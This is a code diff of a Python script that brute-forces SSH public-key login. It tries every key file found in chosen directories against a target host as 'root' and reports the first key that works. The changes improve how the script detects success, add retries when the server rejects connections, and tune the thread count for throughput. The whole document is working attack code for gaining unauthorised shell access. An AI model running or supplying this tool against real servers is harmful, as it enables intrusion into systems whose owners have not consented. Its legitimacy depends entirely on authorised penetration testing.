@@ -12,9 +12,10 @@ config = {
     "users":  ["root"], # list of usernames to attempt
     "dirs":  ["./"], # list of directories of keys to attempt
                   # (only files without "." will be attempted so .pub is excluded)
-    "error_str":  "Permission denied", # expected response for a failed attempt ["Permission denied"]
+    "success_code":  0, # expected process exit code for a successful attempt
+    "reject_str": "Connection closed by remote host", # string that indicates connection rejection
     "period": 5, # reporting period in seconds [5]
-    "threads": 12, # 0 to auto calibrate for highest throughput [12]
+    "threads": 8, # number of threads. Keep this low to prevent rejected connections [8]
     "debug": False # prints attempt info and stder [False]
 }
 
@@ -24,30 +25,31 @@ pool = 0
 die = False
 
 class colours:
-    green = "\033[92m"
-    yellow = "\033[93m"
-    red = "\033[91m"
+    red = "\033[31m"
+    green = "\033[32m"
     bold = "\033[1m"
     clear = "\033[0m"
 
 def attempt(config, user, key):
         global pool
         global die
-        cmd = ("ssh -l " + user
-        + " -p " + config["port"]
-        + " -oKexAlgorithms=+diffie-hellman-group1-sha1 "
-        + " -oHostKeyAlgorithms=+ssh-dss "
-        + " -oHostKeyAlgorithms=+ssh-rsa "
-        + " -oPubkeyAcceptedKeyTypes=+ssh-dss "
-        + " -oPubkeyAcceptedKeyTypes=+ssh-rsa "
-        + " -o PreferredAuthentications=publickey"
-        + " -i " + key 
-        + " " + config["host"])
-        p = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, close_fds=True)
-        p.stdin.close()
-        err = p.stderr.read().decode("utf-8")
-        if config["debug"]: print(user+"@"+config["host"]+":"+config["port"]+" with "+key+" -> "+err, end="")
-        if (config["error_str"] not in err and not die):
+        cmd = ("ssh"
+        + " -oKexAlgorithms=+diffie-hellman-group1-sha1"
+        + " -oHostKeyAlgorithms=+ssh-dss"
+        + " -oHostKeyAlgorithms=+ssh-rsa"
+        + " -oPubkeyAcceptedKeyTypes=+ssh-dss"
+        + " -oPubkeyAcceptedKeyTypes=+ssh-rsa"
+        + " -oPreferredAuthentications=publickey"
+        + " -T -p %s -i %s %s@%s" % (config["port"], key, user, config["host"])
+        )
+        p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        while (config["reject_str"] in p.stdout.decode("utf-8")):
+            print("Connection rejected - try reducing thread count. Retrying %s" % key)
+            p = subprocess.run(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+        if config["debug"]:
+            print(user+"@"+config["host"]+":"+config["port"]+" with " + key
+                    + " -> code=%s\t" % p.returncode+p.stdout.decode("utf-8"), end="")
+        if (p.returncode == config["success_code"] and not die):
             print("\a"*4 + "[" + colours.green + colours.bold + "SUCCESS" + colours.clear + "] valid key found: " + key)
             die = True
         else:
@@ -57,7 +59,7 @@ def enum_dir(dirs):
     k = []
     for i in dirs:
         j = os.listdir(i)
-        k += [i+k for k in j if "." not in k]
+        k += [os.path.join(i,k) for k in j if "." not in k]
     k.sort()
     return k
 
@@ -66,7 +68,7 @@ def suicide(x, y):
     die = True
 
 def cleanup():
-    print("\nKilling orphaned children... ", end="")
+    print("\nWaiting for children to finish... ", end="")
     while(len(threading.enumerate()) > 1):
         pass
     print("DONE")
@@ -100,6 +102,8 @@ def main(config):
                 print("Tested: %d\tRemaining: %d\tElapsed: %dm\tSpeed: %.1f/s\tETA: %dm" %(i,n-i,(time.time()-start_time)/60,l/10,(n-i)/i*(time.time()-start_time)/60))
                 cur_time = time.time()
                 l = 0
+    while(len(threading.enumerate()) > 1):
+        pass
     print("\a"*4 + "[" + colours.red + colours.bold + "FAILURE" + colours.clear + "] all keys exhuasted")
     cleanup()
 
